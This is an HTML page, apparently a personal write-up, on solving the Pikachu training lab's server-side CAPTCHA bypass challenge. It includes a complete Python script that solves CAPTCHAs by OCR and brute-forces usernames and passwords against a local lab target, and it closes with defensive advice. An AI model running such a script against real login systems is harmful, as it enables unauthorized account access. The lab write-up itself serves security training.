@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-暴力破解-验证码绕过(on server) Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .code-block { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow-x: auto; }
+        .code-comment { color: #6a737d; }
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-function { color: #6f42c1; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-暴力破解-验证码绕过(on server) Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, 暴力破解, 验证码绕过, Python, ddddocr</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>Web - 暴力破解 (Burte Force)</li>
+        <li><strong>题目名称：</strong>验证码绕过 (on server)</li>
+        <li><strong>目标：</strong>页面增加了服务端验证码，但存在逻辑缺陷。需要绕过验证码机制，自动化爆破出正确的账号密码。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>漏洞原理：</strong></p>
+    <p>服务端虽然增加了验证码，但验证码并没有和用户会话（Session）进行严格的绑定，或者验证码在验证成功后并没有被销毁，导致存在<strong>验证码复用漏洞</strong>。</p>
+    
+    <div class="diff-box">
+        <strong>工具选型与心路历程：</strong>
+        <ul>
+            <li><strong>Burp Suite 社区版：</strong>虽然可以配置 Intruder，但由于社区版限速（每秒1个请求），导致发起爆破时等待时间过长。Pikachu 的 Session 生命周期极短，往往还没跑完，验证码就失效了，引发 <code>验证码错误</code>。</li>
+            <li><strong>Python 自动化脚本：</strong>为了实现极速爆破，改用 Python 的 <code>requests</code> 库维持会话，并结合 <code>ddddocr</code> 自动识别验证码，每秒钟可以发起多次请求，完美避开 Session 过期问题。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：环境搭建与踩坑（安装 ddddocr）</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 在 VS Code 终端运行：<code>pip install ddddocr requests</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">踩坑记录：</span>直接使用官方源下载 ddddocr（包含约76MB的AI模型文件）极慢，速度仅 20kB/s，预计需要 50 多分钟。</p>
+        <p class="info-line"><span class="info-label">解决办法：</span>更换为清华大学国内镜像源进行下载。命令为：<code>pip install ddddocr -i https://pypi.tuna.tsinghua.edu.cn/simple</code>，几秒内即下载安装完毕。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：编写全自动爆破脚本</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 在 VS Code 新建 <code>bf_server.py</code>，粘贴以下代码：</p>
+        </div>
+<pre class="code-block"><code><span class="code-keyword">import</span> requests
+<span class="code-keyword">import</span> ddddocr
+<span class="code-keyword">import</span> time
+
+<span class="code-comment"># ================== 配置区域 ==================</span>
+<span class="code-comment"># 目标URL（登录提交接口）</span>
+target_url = <span class="code-string">"http://127.0.0.1/pikachu/vul/burteforce/bf_server.php"</span>
+<span class="code-comment"># 验证码图片接口（Pikachu 默认图片生成路径）</span>
+vcode_url = <span class="code-string">"http://127.0.0.1/pikachu/inc/showvcode.php"</span>
+
+<span class="code-comment"># 精简字典，方便快速演示</span>
+users = [<span class="code-string">"admin"</span>, <span class="code-string">"test"</span>, <span class="code-string">"pikachu"</span>, <span class="code-string">"root"</span>]
+passwords = [<span class="code-string">"123456"</span>, <span class="code-string">"abc123"</span>, <span class="code-string">"000000"</span>, <span class="code-string">"password"</span>, <span class="code-string">"admin888"</span>]
+<span class="code-comment"># ==============================================</span>
+
+<span class="code-comment"># 初始化 OCR 识别引擎</span>
+ocr = ddddocr.DdddOcr()
+
+print(<span class="code-string">"[*] 开始全自动爆破（自动识别动态验证码）..."</span>)
+
+<span class="code-comment"># 双重循环遍历用户名和密码字典</span>
+<span class="code-keyword">for</span> user <span class="code-keyword">in</span> users:
+    <span class="code-keyword">for</span> pwd <span class="code-keyword">in</span> passwords:
+        <span class="code-comment"># 关键点：每次请求前创建一个新的 Session，保证 Cookie 独立</span>
+        session = requests.Session()
+        
+        <span class="code-keyword">try</span>:
+            <span class="code-comment"># 1. 脚本自动请求一张最新的验证码图片</span>
+            img_res = session.get(vcode_url, timeout=5)
+            
+            <span class="code-comment"># 2. ddddocr 自动识别图片中的字符</span>
+            vcode = ocr.classification(img_res.content)
+            print(<span class="code-string">f"[*] 尝试: {user}/{pwd} | 自动识别验证码: {vcode}"</span>)
+            
+            <span class="code-comment"># 3. 构造登录请求（使用同一个 session，确保验证码和Cookie对应）</span>
+            data = {
+                <span class="code-string">"username"</span>: user,
+                <span class="code-string">"password"</span>: pwd,
+                <span class="code-string">"vcode"</span>: vcode,
+                <span class="code-string">"submit"</span>: <span class="code-string">"Login"</span>
+            }
+            res = session.post(target_url, data=data, timeout=5)
+            
+            <span class="code-comment"># 4. 判断响应结果</span>
+            <span class="code-keyword">if</span> <span class="code-string">"login success"</span> <span class="code-keyword">in</span> res.text:
+                print(<span class="code-string">f"\n[+] 爆破成功！账号: {user}  密码: {pwd}\n"</span>)
+                exit() <span class="code-comment"># 找到密码后直接退出程序</span>
+            <span class="code-keyword">elif</span> <span class="code-string">"验证码错误"</span> <span class="code-keyword">in</span> res.text:
+                print(<span class="code-string">"    [-] 验证码识别错误，自动跳过..."</span>)
+                <span class="code-keyword">continue</span> <span class="code-comment"># OCR 偶尔会认错，跳过本次继续下一次</span>
+            <span class="code-keyword">else</span>:
+                print(<span class="code-string">"    [-] 账号或密码错误"</span>)
+                
+        <span class="code-keyword">except</span> Exception <span class="code-keyword">as</span> e:
+            print(<span class="code-string">f"[!] 请求异常: {e}"</span>)
+        
+        time.sleep(0.1) <span class="code-comment"># 稍微延时，避免请求过快把本地靶场打挂</span>
+
+print(<span class="code-string">"[*] 爆破结束，未找到正确密码。"</span>)</code></pre>
+        <p class="info-line"><span class="info-label">脚本核心逻辑说明：</span></p>
+        <ul>
+            <li><code>requests.Session()</code>：创建一个会话对象。这非常重要！因为验证码图片是绑定在这个 Session 的 Cookie 上的。如果用普通请求，获取图片的 Cookie 和提交表单的 Cookie 不一致，就会报验证码错误。</li>
+            <li><code>ocr.classification()</code>：这是 ddddocr 库的核心方法，传入图片的二进制内容，返回识别出的字符串。</li>
+            <li><code>continue</code> 和 <code>exit()</code>：识别错误时，使用 <code>continue</code> 跳过本次循环，继续下一次尝试；如果成功匹配到 <code>login success</code>，则直接 <code>exit()</code> 退出脚本。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：运行脚本，成功爆破</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 终端运行 <code>python bf_server.py</code>。</p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>脚本自动识别出验证码 <code>tf1df9</code>，并在尝试第一组账号时即告成功：<code>[+] 爆破成功！账号: admin  密码: 123456</code>。</p>
+        <p class="info-line"><span class="info-label">验证结果：</span> 回到浏览器，输入 admin / 123456 及任意验证码（只要第一次输入正确），成功返回 <code>login success</code>，通关！</p>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：Burp Suite 社区版限速与 Session 超时。</strong>最初使用 Burp 进行手动抓包和 Intruder 爆破。发现所有请求长度一致。排查 Response 发现提示“验证码已失效”。原因是抓包后配置字典耗时过长，Pikachu 服务端 Session 或验证码有极短的生命周期限制。转而使用 Python 脚本实现毫秒级自动化请求，解决了时间差问题。</li>
+        <li><strong>坑2：Python 依赖包下载极慢。</strong>ddddocr 包含 AI 模型权重文件，直接从 PyPI 官方源下载仅 20kB/s。通过更换国内清华镜像源（-i 参数）解决。</li>
+        <li><strong>坑3：OCR 识别偶尔会出错。</strong>脚本中使用 <code>elif "验证码错误" in res.text: continue</code>，遇到识别错误时自动跳过当前组合，极大地提升了自动化脚本的健壮性。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>服务端验证码绕过核心逻辑：</strong>如果服务端未将验证码与当前会话严格绑定，或者验证成功后未销毁验证码，攻击者就可以实现“一次识别，多次复用”。</li>
+        <li><strong>自动化脚本的降维打击：</strong>面对带有验证码的场景，使用 <code>ddddocr</code> 结合 <code>requests.Session()</code>，可以做到“取图 -> 识别 -> 提交”一气呵成，彻底打破手工抓包的时间瓶颈。</li>
+        <li><strong>防御建议：</strong>验证码必须一次性使用，验证成功后立即在 Session 中销毁；验证码必须设置较短的有效期（如 60 秒）；同时应增加登录失败次数限制。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
